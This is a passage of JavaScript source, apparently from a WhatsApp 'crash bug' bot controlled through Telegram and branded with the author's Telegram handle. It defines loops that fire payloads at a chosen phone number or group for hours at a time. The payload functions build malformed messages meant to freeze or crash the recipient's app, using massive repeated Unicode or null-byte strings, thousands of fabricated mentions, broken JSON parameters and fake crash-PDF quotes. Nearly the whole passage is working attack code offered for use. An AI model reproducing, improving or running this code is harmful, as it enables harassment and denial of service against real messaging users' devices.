            await new Promise(resolve => setTimeout(resolve, 10000));
            count = 0;
          }
        }
      } catch (error) {
        console.error(`❌Error while sending: ${error.message}`);
        const userBot = getUserBot(botInstance);
        await userBot.sendMessage(chatId, `❌ Error in groupui: ${error.message}. Process stopped.`);
        return; // Stop the whole function after one error
      }
    }
    console.log(chalk.green(`👀 Finished batch ${batch}`));
    batch++;
    if (batch <= maxBatches) {
      console.log(chalk.blue(`Waiting for 1 hour before next batch...`));
      await new Promise(resolve => setTimeout(resolve, batchDelay));
    }
  }
  console.log(`✅ Done! Total batches sent: ${batch - 1}`);
}

async function xeonIosGroupInitiator(durationHours, target, userNumber, chatId, botInstance) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let batch = 1;
  const maxBatches = 5;
  const batchDuration = 60 * 60 * 1000; // 1 hour batch duration
  const batchDelay = 60 * 60 * 1000; // 1 hour delay between batches

  while (batch <= maxBatches && Date.now() - startTime < totalDurationMs) {
    const batchStart = Date.now();
    console.log(chalk.green(`👀 Starting batch ${batch}...`));
    let count = 0;
    const maxLoops = 25;

    while (Date.now() - batchStart < batchDuration) {
      try {
        if (!(await validateSession(userNumber, chatId, botInstance))) {
        console.log(`⚠️ Session invalid for ${target}, stopping...`);
        return;
      }
        
        while (count < maxLoops) {
          await Promise.all([
            xeonIosInviGp(target, userNumber, chatId, botInstance)
          ]);
          await sleep(1000);
          console.log(chalk.yellow(` ┌────────────────────────┐ │ Sending... 🦄 └────────────────────────┘ `));
          count++;
          
          if (count >= maxLoops) {
            console.log(chalk.bgYellow.black("Loop 25 reached, sleep 10 seconds before restart..."));
            await new Promise(resolve => setTimeout(resolve, 10000));
            count = 0;
          }
        }
      } catch (error) {
        console.error(`❌Error while sending: ${error.message}`);
        const userBot = getUserBot(botInstance);
        await userBot.sendMessage(chatId, `❌ Error in groupios: ${error.message}. Process stopped.`);
        return; // Stop the whole function after one error
      }
    }
    console.log(chalk.green(`👀 Finished batch ${batch}`));
    batch++;
    if (batch <= maxBatches) {
      console.log(chalk.blue(`Waiting for 1 hour before next batch...`));
      await new Promise(resolve => setTimeout(resolve, batchDelay));
    }
  }
  console.log(`✅ Done! Total batches sent: ${batch - 1}`);
}

async function XiosInviNew(durationHours, target, userNumber, chatId, botInstance) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  const maxLoops = 25;

  while (Date.now() - startTime < totalDurationMs) {
    let count = 0;
    try {
      if (!(await validateSession(userNumber, chatId, botInstance))) {
        console.log(`⚠️ Session invalid for ${target}, stopping...`);
        return;
      }
      
      while (count < maxLoops) {
        await Promise.all([
          xiosinv(target, userNumber, chatId, botInstance)
        ]);
        await sleep(1000);
        console.log(`🦄 Sent iosinvisible to ${target} ${count + 1}/${maxLoops}`);
        count++;
        
        if (count >= maxLoops) {
          console.log(chalk.bgYellow.black("Loop 25 reached, sleep 10 seconds before restart..."));
          await new Promise(resolve => setTimeout(resolve, 10000));
          count = 0;
        }
      }
    } catch (error) {
      console.error(`❌ Error in iosinvisible: ${error.message}`);
      const userBot = getUserBot(botInstance);
      await userBot.sendMessage(chatId, `❌ Error in iosinvisible: ${error.message}. Process stopped.`);
      return; // Stop the function after one error
    }
  }
  console.log(`✅ Done! Completed sending iosinvisible to ${target}`);
}

async function XiosInviOld(durationHours, target, userNumber, chatId, botInstance) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  const maxLoops = 25;

  while (Date.now() - startTime < totalDurationMs) {
    let count = 0;
    try {
      if (!(await validateSession(userNumber, chatId, botInstance))) {
        console.log(`⚠️ Session invalid for ${target}, stopping...`);
        return;
      }
      
      while (count < maxLoops) {
        await Promise.all([
          xeonIosInvi(target, userNumber, chatId, botInstance)
        ]);
        await sleep(1000);
        console.log(`🦄 Sent iosinvisible to ${target} ${count + 1}/${maxLoops}`);
        count++;
        
        if (count >= maxLoops) {
          console.log(chalk.bgYellow.black("Loop 25 reached, sleep 10 seconds before restart..."));
          await new Promise(resolve => setTimeout(resolve, 10000));
          count = 0;
        }
      }
    } catch (error) {
      console.error(`❌ Error in iosvisible: ${error.message}`);
      const userBot = getUserBot(botInstance);
      await userBot.sendMessage(chatId, `❌ Error in iosvisible: ${error.message}. Process stopped.`);
      return; // Stop the function after one error
    }
  }
  console.log(`✅ Done! Completed sending iosinvisible to ${target}`);
}

async function xeonSpamDroidInitiator(durationHours, target, userNumber, chatId, botInstance) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();

  while (Date.now() - startTime < totalDurationMs) {
    try {
      if (!(await validateSession(userNumber, chatId, botInstance))) {
        console.log(`⚠️ Session invalid for ${target}, stopping...`);
        return;
      }
      await xeonSpamDroid(target, userNumber, chatId, botInstance);
      await sleep(1000);
      await forcer(target, userNumber, chatId, botInstance);
      await sleep(1000);
      console.log(`🦄 Sent iosvisible to ${target}`);
    } catch (error) {
      console.error(`❌ Error while sending: ${error.message}`);
      if (
        error?.output?.statusCode === 428 ||
        error?.output?.statusCode === 408 ||
        error.message.includes('Connection Closed') ||
        error.message.includes('Timed out') ||
        error.code === 'ECONNABORTED'
      ) {
        console.log(`Bug fcspambeta ended for ${target} ✅`);
        return;
      }
    }
  }
  console.log(`✅ Done! Completed sending fcspambeta to ${target}`);
}

async function jammerxInitiator(durationHours, target, userNumber, chatId, botInstance) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();

  while (Date.now() - startTime < totalDurationMs) {
    try {
      if (!(await validateSession(userNumber, chatId, botInstance))) {
        console.log(`⚠️ Session invalid for ${target}, stopping...`);
        return;
      }
      await jammerking(target, userNumber, chatId, botInstance);
      await sleep(1000);
    } catch (error) {
      console.error(`❌ Error while sending: ${error.message}`);
      if (
        error?.output?.statusCode === 428 ||
        error?.output?.statusCode === 408 ||
        error.message.includes('Connection Closed') ||
        error.message.includes('Timed out') ||
        error.code === 'ECONNABORTED'
      ) {
        console.log(`Bug jammerx ended for ${target} ✅`);
        return;
      }
    }
  }
  console.log(`✅ Done! Completed sending jammerx to ${target}`);
}

async function delayxInitiator(durationHours, target, userNumber, chatId, botInstance) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();

  while (Date.now() - startTime < totalDurationMs) {
    try {
      if (!(await validateSession(userNumber, chatId, botInstance))) {
        console.log(`⚠️ Session invalid for ${target}, stopping...`);
        return;
      }
      await jammerking2(target, userNumber, chatId, botInstance);
      await sleep(1000);
    } catch (error) {
      console.error(`❌ Error while sending: ${error.message}`);
      if (
        error?.output?.statusCode === 428 ||
        error?.output?.statusCode === 408 ||
        error.message.includes('Connection Closed') ||
        error.message.includes('Timed out') ||
        error.code === 'ECONNABORTED'
      ) {
        console.log(`Bug delayx ended for ${target} ✅`);
        return;
      }
    }
  }
  console.log(`✅ Done! Completed sending delayx to ${target}`);
}

async function delaypermaInitiator(durationHours, target, userNumber, chatId, botInstance) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();

  while (Date.now() - startTime < totalDurationMs) {
    try {
      if (!(await validateSession(userNumber, chatId, botInstance))) {
        console.log(`⚠️ Session invalid for ${target}, stopping...`);
        return;
      }
      await xeonGalaxtos(target, userNumber, chatId, botInstance);
      await sleep(1000);
    } catch (error) {
      console.error(`❌ Error while sending: ${error.message}`);
      if (
        error?.output?.statusCode === 428 ||
        error?.output?.statusCode === 408 ||
        error.message.includes('Connection Closed') ||
        error.message.includes('Timed out') ||
        error.code === 'ECONNABORTED'
      ) {
        console.log(`Bug delayperma ended for ${target} ✅`);
        return;
      }
    }
  }
  console.log(`✅ Done! Completed sending delayperma to ${target}`);
}

async function groupMixInitiator(durationHours, target, userNumber, chatId, botInstance) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();

  while (Date.now() - startTime < totalDurationMs) {
    try {
      if (!(await validateSession(userNumber, chatId, botInstance))) {
        console.log(`⚠️ Session invalid for ${target}, stopping...`);
        return;
      }
      await xeonGroupDoc(target, userNumber, chatId, botInstance);
      await sleep(1000);
      await xeonIosInviGp(target, userNumber, chatId, botInstance);
      await sleep(1000);
      await xeonUiKingGp(target, userNumber, chatId, botInstance);
      await sleep(1000);
      await xeonGroupDoc(target, userNumber, chatId, botInstance);
      await sleep(1000);
      console.log(`🦄 Sent groupmix to ${target}`);
    } catch (error) {
      console.error(`❌ Error while sending: ${error.message}`);
      if (
        error?.output?.statusCode === 428 ||
        error?.output?.statusCode === 408 ||
        error.message.includes('Connection Closed') ||
        error.message.includes('Timed out') ||
        error.code === 'ECONNABORTED'
      ) {
        console.log(`Bug groupmix ended for ${target} ✅`);
        return;
      }
    }
  }
  console.log(`✅ Done! Completed sending groupmix to ${target}`);
}

async function forcexgroup(target, userNumber, chatId, botInstance, loopCount = 5) {
  // Validate session
  if (!(await validateSession(userNumber, chatId, botInstance))) {
    throw new Error('No active WhatsApp session');
  }

  // Validate group JID
  if (!target.endsWith('@g.us')) {
    throw new Error('Invalid group JID. It must end with @g.us');
  }

  const userSock = sessions.get(userNumber);
  const userBot = getUserBot(botInstance);

  try {

    for (let i = 0; i < loopCount; i++) {
      // Recheck session before each send
      if (!(await validateSession(userNumber, chatId, botInstance))) {
        throw new Error('No active WhatsApp session');
      }

      await sleep(1050);
      await userSock.relayMessage(target, {
        messageContextInfo: {
          messageSecret: "eed1zxI49cxiovBTUFLIEWi1shD9HgIOghONuqPDGTk=",
          deviceListMetaData: {},
          deviceListMetadataVersion: 2
        },
        scheduledCallCreationMessage: {
          scheduledTimestampMs: '1200',
          callType: "AUDIO",
          title: '👻'
        }
      }, {
        additionalAttributes: {
          edit: '7'
        }
      });
    }
  } catch (error) {
  console.error(`Error in forcexgroup for ${userNumber}:`, error.message);
  const userBot = getUserBot(botInstance);
  await userBot.sendMessage(chatId, `❌ Error in forcegroup: ${error.message}. Process stopped.`);
  throw error; // Keep the throw to maintain behavior, but only one error message is sent
}
}

// Function for forceblock
async function forceblock(target, userNumber, chatId, botInstance, loopCount = 5) {
  // Validate session
  if (!(await validateSession(userNumber, chatId, botInstance))) {
    throw new Error('No active WhatsApp session');
  }

  if (!target.endsWith('@s.whatsapp.net') || target.includes('@g.us')) {
    throw new Error('Invalid target JID. Only individual WhatsApp numbers are supported.');
  }

  const userSock = sessions.get(userNumber);

  try {
    for (let i = 0; i < loopCount; i++) {
      await sleep(1050);
      await userSock.relayMessage(target, {
        messageContextInfo: {
          messageSecret: "eed1zxI49cxiovBTUFLIEWi1shD9HgIOghONuqPDGTk=",
          deviceListMetaData: {},
          deviceListMetadataVersion: 2
        },
        scheduledCallCreationMessage: {
          scheduledTimestampMs: '1200',
          callType: "AUDIO",
          title: '👻'
        }
      }, {
        additionalAttributes: {
          edit: '7'
        }
      });
    }
  } catch (error) {
    console.error(`Error in forceblock for ${userNumber}:`, error.message);
    throw error;
  }
}

async function xiosinv(target, userNumber, chatId, botInstance) {
  try {
    // Validate session
    if (!(await validateSession(userNumber, chatId, botInstance))) {
      throw new Error('No active WhatsApp session');
    }

    // Validate target
    if (!target.endsWith('@s.whatsapp.net') || target.includes('@g.us')) {
      throw new Error('Invalid target JID. Only individual WhatsApp numbers are supported.');
    }

    const userSock = sessions.get(userNumber);

    const msg = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: 'Telegram: @dgxeon13\n',
                    description: "\n\n\n" + "𑪆".repeat(260000),
                    singleSelectReply: {
                        selectedId: "id"
                    },
                    listType: 1
                }
            }
        }
    }, {
        ephemeralExpiration: 0,
        forwardingScore: 9741,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0")
    });
    await userSock.relayMessage(target, {
        groupStatusMessageV2: {
            message: msg.message
        }
    }, {
        participant: { jid: target }
    });
  } catch (err) {
  console.error(`Error in iosinvisible for ${userNumber}:`, err.message);
  const userBot = getUserBot(botInstance);
  await userBot.sendMessage(chatId, `❌ Error in iosinvisible: ${err.message}. Process stopped.`);
  throw err; // Keep the throw to maintain behavior
}
}

async function xeonIosInvi(target, userNumber, chatId, botInstance) {
  try {
    // Validate session
    if (!(await validateSession(userNumber, chatId, botInstance))) {
      throw new Error('No active WhatsApp session');
    }

    // Validate target
    if (!target.endsWith('@s.whatsapp.net') || target.includes('@g.us')) {
      throw new Error('Invalid target JID. Only individual WhatsApp numbers are supported.');
    }

    const userSock = sessions.get(userNumber);

    await userSock.sendMessage(target, {
text: "🧪‌⃰Ꮡ‌‌" + "⛧ Telegram :: @dgxeon13 ⛧" + "҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
contextInfo: {
externalAdReply: {
title: `⛧ Telegram :: @dgxeon13 ⛧`,
body: `Haii`,
previewType: "PHOTO",
thumbnail: "",
sourceUrl: `https://example.com/dgxeon`
}
}
}, {})
  } catch (err) {
  console.error(`Error in iosvisible for ${userNumber}:`, err.message);
  const userBot = getUserBot(botInstance);
  await userBot.sendMessage(chatId, `❌ Error in iosvisible: ${err.message}. Process stopped.`);
  throw err; // Keep the throw to maintain behavior
}
}

async function xeonBetaPayment(target, userNumber, chatId, botInstance) {
  try {
    // Validate session
    if (!(await validateSession(userNumber, chatId, botInstance))) {
      throw new Error('No active WhatsApp session');
    }

    // Validate target
    if (!target.endsWith('@s.whatsapp.net') || target.includes('@g.us')) {
      throw new Error('Invalid target JID. Only individual WhatsApp numbers are supported.');
    }

    const userSock = sessions.get(userNumber);

    userSock.relayMessage(target, {
        interactiveMessage: {
            body: {
                text: 'Telegram: @dgxeon13'
            },
            header: {
                hasMediaAttachment: true,
                jpegThumbnail: o,
                contextInfo: {
                participant: target
                }
            },
            nativeFlowMessage: {
                buttons: [
                    {
                        name: "payment_method",
                        buttonParamsJson: "{\"reference_id\":\"X\",\"payment_method\":\"confirmm\",\"payment_timestamp\":null,\"share_payment_status\":false\"}"
                    }
                ]
            }
        }
    }, {
    participant: { jid: target },
    additionalNodes: [
            {
                tag: 'biz',
                attrs: { native_flow_name: 'payment_method' }
            }
        ]
    });
  } catch (err) {
    console.error(`Error in fcbeta for ${userNumber}:`, err.message);
    throw err;
  }
}

async function xsiphone(target, userNumber, chatId, botInstance) {
  try {
    // Validate session
    if (!(await validateSession(userNumber, chatId, botInstance))) {
      throw new Error('No active WhatsApp session');
    }

    // Validate target
    if (!target.endsWith('@s.whatsapp.net') || target.includes('@g.us')) {
      throw new Error('Invalid target JID. Only individual WhatsApp numbers are supported.');
    }

    const userSock = sessions.get(userNumber);
	const msg = {
    "viewOnceMessage": {
      "message": {
        "listResponseMessage": {
          "title": "Telegram: @dgxeon13",
          "listType": "SINGLE_SELECT",
          "singleSelectReply": {},
          "description": xeonKingIos
        }
      }
    }
  };
  const allmsg = generateWAMessageFromContent(target, proto.Message.fromObject(msg), {});
  userSock.relayMessage(target, allmsg.message, { messageId: allmsg.key.sender });
  } catch (err) {
    console.error(`Error in xsiphone for ${userNumber}:`, err.message);
    throw err;
  }
}

async function xeonAndroidInvisible(target, userNumber, chatId, botInstance) {
  try {
    // Validate session
    if (!(await validateSession(userNumber, chatId, botInstance))) {
      throw new Error('No active WhatsApp session');
    }

    // Validate target
    if (!target.endsWith('@s.whatsapp.net') || target.includes('@g.us')) {
      throw new Error('Invalid target JID. Only individual WhatsApp numbers are supported.');
    }

    const userSock = sessions.get(userNumber);

    let message = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "Telegram: @dgxeon13",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.035,
                degreesLongitude: 922.999999999999,
                name: "Telegram: @dgxeon13",
                address: "Telegram: @dgxeon13",
              },
            },
            body: {
              text: "Telegram: @dgxeon13",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
            },
            contextInfo: {
              participant: target,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  { length: 30000 },
                  () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                ),
              ],
            },
          },
        },
      },
    };

    await userSock.relayMessage(target, message, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
  } catch (err) {
    console.error(`Error in xdroidinvisible for ${userNumber}:`, err.message);
    throw err;
  }
}

async function forcer(target, userNumber, chatId, botInstance) {
  try {
    // Validate session
    if (!(await validateSession(userNumber, chatId, botInstance))) {
      throw new Error('No active WhatsApp session');
    }

    // Validate target
    if (!target.endsWith('@s.whatsapp.net') || target.includes('@g.us')) {
      throw new Error('Invalid target JID. Only individual WhatsApp numbers are supported.');
    }

    const userSock = sessions.get(userNumber);

const rajaXeon = {
  key: {
    remoteJid: '120363401744741900@g.us',
    fromMe: true,
    id: '1BCED5F78D153A18F0AC68B38DAB8D9A',
    participant: '916909137213@s.whatsapp.net'
  },
  messageTimestamp: 1753786706,
  pushName: 'Telegram: @dgxeon13',
  broadcast: false,
  status: 2,
  message: {
    conversation: 'Telegram: @dgxeon13',
    messageContextInfo: {
      messageSecret: new Uint8Array([
        123, 153, 59, 66, 69, 1, 31, 219,
        233, 201, 204, 107, 149, 77, 233, 100,
        80, 15, 30, 192, 133, 13, 171, 48,
        44, 27, 61, 135, 73, 149, 172, 105
      ])
    }
  },
  id: '1BCED5F78D153A18F0AC68B38DAB8D9A',
  isBaileys: false,
  chat: '120363401744741900@g.us',
  fromMe: true,
  isGroup: true,
  sender: '916909137213@s.whatsapp.net',
  participant: '916909137213@s.whatsapp.net',
  mtype: 'conversation',
  msg: 'Telegram: @dgxeon13',
  body: 'Telegram: @dgxeon13',
  quoted: null,
  mentionedJid: [],
  text: 'Telegram: @dgxeon13',
  reply: function() {}, // Placeholder for function
  copy: function() {}, // Placeholder for function
  copyNForward: function() {} // Placeholder for function
};

    await userSock.relayMessage(
    target,
    {
      locationMessage: {
        degreesLatitude: 'Telegram: @dgxeon13',
        degreesLongitude: 'Telegram: @dgxeon13',
        name: `Telegram: @dgxeon13`,
        url: bugUrl,
        contextInfo: {
          forwardingScore: 508,
          isForwarded: true,
          isLiveLocation: true,
          fromMe: false,
          participant: '0@s.whatsapp.net',
          remoteJid: userNumber + '@s.whatsapp.net',
          quotedMessage: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/34673265_965442988481988_3759890959900226993_n.enc?ccb=11-4&oh=01_AdRGvYuQlB0sdFSuDAeoDUAmBcPvobRfHaWRukORAicTdw&oe=65E730EB&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/pdf",
              title: "crash",
              pageCount: 1000000000,
              fileName: "crash.pdf",
              contactVcard: true
            }
          },
          forwardedNewsletterMessageInfo: {
            newsletterJid: '120363274419284848@newsletter',
            serverMessageId: 1,
            newsletterName: " " + bug + bug
          },
          externalAdReply: {
            title: ' Telegram: @dgxeon13 ',
            body: 'Telegram: @dgxeon13',
            mediaType: 0,
            thumbnail: rajaXeon,
            jpegThumbnail: rajaXeon,
            mediaUrl: `https://www.youtube.com/@dgxeon`,
            sourceUrl: `https://www.youtube.com/@dgxeon`
          }
        }
      }
    },
    {
      participant: {
        jid: target
      }
    },
    {
      messageId: null
    }
);
  } catch (err) {
    console.error(`Error in forcer for ${userNumber}:`, err.message);
    throw err;
  }
}

async function xeonSpamDroid(target, userNumber, chatId, botInstance) {
  try {
    // Validate session
    if (!(await validateSession(userNumber, chatId, botInstance))) {
      throw new Error('No active WhatsApp session');
    }

    // Validate target
    if (!target.endsWith('@s.whatsapp.net') || target.includes('@g.us')) {
      throw new Error('Invalid target JID. Only individual WhatsApp numbers are supported.');
    }

    const userSock = sessions.get(userNumber);

    let message = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "ꦾ".repeat(1000),
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: ["0@s.whatsapp.net", "13135550002@s.whatsapp.net"],
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: JSON.stringify({
                  status: true,
                }),
              },
              {
                name: "call_permission_request",
                buttonParamsJson: JSON.stringify({
                  status: true,
                }),
              },
              ...Array(18).fill().map(() => ({
                name: "mpm",
                buttonParamsJson: "",
              })),
            ],
            messageParamsJson: "[{".repeat(10000),
            messageParamsJson: "[{".repeat(10000),
            messageParamsJson: "[{".repeat(10000),
          },
        },
      },
    },
  };
    
    await userSock.relayMessage(target, message, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
  } catch (err) {
    console.error(`Error in xspamdroid for ${userNumber}:`, err.message);
    throw err;
  }
}

async function jammerking(target, userNumber, chatId, botInstance) {
  try {
    // Validate session
    if (!(await validateSession(userNumber, chatId, botInstance))) {
      throw new Error('No active WhatsApp session');
    }

    // Validate target
    if (!target.endsWith('@s.whatsapp.net') || target.includes('@g.us')) {
      throw new Error('Invalid target JID. Only individual WhatsApp numbers are supported.');
    }

    const userSock = sessions.get(userNumber);

    const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: "#@dgxeon13", format: "DEFAULT" },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1000000),
            version: 3
          },
          contextInfo: {
            mentionedJid: [
              "13135550002@s.whatsapp.net",
              ...Array.from({ length: 1900 }, () =>
                `1${Math.floor(Math.random() * 10000000)}@s.whatsapp.net`
              )
            ],
            externalAdReply: {
              quotedAd: {
                advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
                mediaType: "IMAGE",
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
                caption: `@dgxeon13${"𑇂𑆵𑆴𑆿".repeat(60000)}`
              },
              placeholderKey: {
                remoteJid: "0s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890"
              }
            }
          }
        }
      }
    }
  }, {});

  await userSock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }]
  });
  } catch (err) {
    console.error(`Error in jammerx for ${userNumber}:`, err.message);
    throw err;
  }
}

async function xeonGalaxtos(target, userNumber, chatId, botInstance) {
  try {
    // Validate session
    if (!(await validateSession(userNumber, chatId, botInstance))) {
      throw new Error('No active WhatsApp session');
    }

    // Validate target
    if (!target.endsWith('@s.whatsapp.net') || target.includes('@g.us')) {
      throw new Error('Invalid target JID. Only individual WhatsApp numbers are supported.');
    }

    const userSock = sessions.get(userNumber);

    const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: "@null", format: "DEFAULT" },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\u0000".repeat(1000000),
            version: 3
          },
          contextInfo: {
            mentionedJid: [
              "13135550002@s.whatsapp.net",
              ...Array.from({ length: 1900 }, () =>
                `1${Math.floor(Math.random() * 10000000)}@s.whatsapp.net`
              )
            ],
            externalAdReply: {
              quotedAd: {
                advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
                mediaType: "IMAGE",
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
                caption: `Telegram: @dgxeon13${"𑇂𑆵𑆴𑆿".repeat(60000)}`
              },
              placeholderKey: {
                remoteJid: "0s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890"
              }
            }
          }
        }
      }
    }
  }, {});

  await userSock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }]
  });
  } catch (err) {
    console.error(`Error in delayperma for ${userNumber}:`, err.message);
    throw err;
  }
}

async function jammerking2(target, userNumber, chatId, botInstance, mention = true) {
  try {
    // Validate session
    if (!(await validateSession(userNumber, chatId, botInstance))) {
      throw new Error('No active WhatsApp session');
    }

    // Validate target
    if (!target.endsWith('@s.whatsapp.net') || target.includes('@g.us')) {
      throw new Error('Invalid target JID. Only individual WhatsApp numbers are supported.');
    }

    const userSock = sessions.get(userNumber);

    let sxo = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "Telegram: @dgxeon13",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\x10".repeat(1045000),
                        version: 3
                    },
                   entryPointConversionSource: "galaxy_message",
                }
            }
        }
    }, {
        ephemeralExpiration: 0,
        forwardingScore: 9741,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    });
   let sXoMessage = {
     extendedTextMessage: {
       text: "ꦾ".repeat(300000),
         contextInfo: {
           participant: target,
             mentionedJid: [
               "0@s.whatsapp.net",
                  ...Array.from(
                  { length: 1900 },
                   () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                 )
               ]
             }
           }
         };

     const xso = generateWAMessageFromContent(target, sXoMessage, {});
      await userSock.relayMessage("status@broadcast", xso.message, {
        messageId: xso.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [
                    { tag: "to", attrs: { jid: target }, content: undefined }
                ]
            }]
        }]
    });
    await sleep(500)
     if (mention) {
        await userSock.relayMessage(target, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: xso.key.id,
                        type: 25,
                    },
                },
            },
        }, {});
    }
    await userSock.relayMessage("status@broadcast", sxo.message, {
        messageId: sxo.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [
                    { tag: "to", attrs: { jid: target }, content: undefined }
                ]
            }]
        }]
    });
    await sleep(500);
    if (mention) {
        await userSock.relayMessage(target, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: sxo.key.id,
                        type: 25,
                    },
                },
            },
        }, {});
    }
  } catch (err) {
    console.error(`Error in delayx for ${userNumber}:`, err.message);
    throw err;
  }
}

async function xjammer(target, userNumber, chatId, botInstance) {
  // Validate session
  if (!(await validateSession(userNumber, chatId, botInstance))) {
    throw new Error('No active WhatsApp session');
  }

  if (!target.endsWith('@s.whatsapp.net') || target.includes('@g.us')) {
    throw new Error('Invalid target JID. Only individual WhatsApp numbers are supported.');
  }

  const generateRandomJids = (maxSize) => {
    const jids = [];
    let currentSize = 0;
    while (currentSize < maxSize - 25) {
      const randomNumber = Math.floor(Math.random() * 1e10).toString().padStart(10, '0');
      const jid = `91${randomNumber}@s.whatsapp.net`;
      jids.push(jid);
      currentSize += jid.length + 3;
    }
    return jids;
  };

  const maxSize = 1074689;
  const jids = generateRandomJids(maxSize);

  try {
    const userSock = sessions.get(userNumber);

    for (let i = 0; i < 1000; i++) {
      // Recheck session before each send
      if (!(await validateSession(userNumber, chatId, botInstance))) {
        throw new Error('No active WhatsApp session');
      }

      await sleep(3000);
      let tmsg = await generateWAMessageFromContent(target, {
        extendedTextMessage: {
          text: "",
          contextInfo: {
            stanzaId: userSock.generateMessageTag(),
            participant: "0@s.whatsapp.net",
            remoteJid: "dgxeon@eu",
            mentionedJid: jids,
            fromMe: false,
            isForwarded: true,
            forwardingScore: 999,
            businessMessageForwardInfo: {
              businessOwnerJid: target,
            },
          },
        },
      }, {});

      await userSock.relayMessage("status@broadcast", tmsg.message, {
        messageId: tmsg.key.id,
        statusJidList: [target],
        additionalNodes: [{
          tag: "meta",
          attrs: {},
          content: [{
            tag: "mentioned_users",
            attrs: {},
            content: [{
              tag: "to",
              attrs: { jid: target },
              content: undefined,
            }],
          }],
        }],
      });

      let push = [];
      for (let i = 0; i < 1000; i++) {
        push.push({
          body: proto.Message.InteractiveMessage.Body.fromObject({
            text: ``,
          }),
          footer: proto.Message.InteractiveMessage.Footer.fromObject({
            text: "",
          }),
          header: proto.Message.InteractiveMessage.Header.fromObject({
            title: '',
            hasMediaAttachment: true,
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/34764738_320019993959203_5174575234777775036_n.enc?ccb=11-4&oh=01_AdQVCKhvkaeb2GrB6guuwFGNLlZ7KJCiy6p4AtJKwUNmjg&oe=65536880&_nc_sid=000000&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: "tcHyO7wrPPNctPRoi7x669hT8YEM0oB4Av25pSeG1cQ=",
              fileLength: "73384124",
              height: 1,
              width: 1,
              mediaKey: "/WtTeZEAvMxYIHa4hIrcGExALsiU3CKLMT3lqwNd8yk=",
              fileEncSha256: "BgKFWKbH4aeiME5GrSg/sinfE8Z96dX7Utm1OjmEXXM=",
              directPath: "/v/t62.7118-24/34764738_320019993959203_5174575234777775036_n.enc?ccb=11-4&oh=01_AdQVCKhvkaeb2GrB6guuwFGNLlZ7KJCiy6p4AtJKwUNmjg&oe=65536880&_nc_sid=000000&_nc_hot=1697385259",
              mediaKeyTimestamp: "1697384837",
